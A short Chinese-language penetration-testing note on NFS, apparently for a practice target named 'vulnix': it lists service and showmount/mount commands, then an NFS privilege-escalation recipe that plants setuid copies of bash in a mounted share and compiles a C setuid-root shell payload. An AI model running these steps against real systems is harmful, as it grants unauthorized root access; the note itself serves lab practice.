# （需完善）nfs

1. 开启关闭nfs

```bash
sudo /usr/local/sbin/nfs status
sudo /usr/local/sbin/nfs start
ps aux | grep nfs
```

1. 显示挂载信息

```bash
显示挂载目录
showmount -e 192.168.253.229

mkdir nfs   ---创建个挂载目录
mount -t nfs 【IP】:【目标路径】 【自身路径】  
umount /tmp/nfs   ---全部挂载删除

创建专门权限用户useradd -u 2008 vulnix

这个我用在了windows上
mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
```

1. 利用nfs的传递导致bash权限混淆从而提权

```bash
注意，在挂载目录操作

1）在vulnix【靶标用户】
ssh vulnix@192.168.253.167
cp /bin/bash .

2）在kali执行
cat bash > rong  
chmod 4777 rong
本地计算机的/bin/bash复制到/tmp/nfs并赋权
./bash -p   ---保留原始的shell权限

传递之后需要一个payload，以下两种任选
-------------shell.c--------------
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/sh"); }
----------------------------------
gcc shell.c -o shell
chmod 4777 shell
./shell
成功提权！

------------------------------------
#include <stdio.h>

int main()
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```
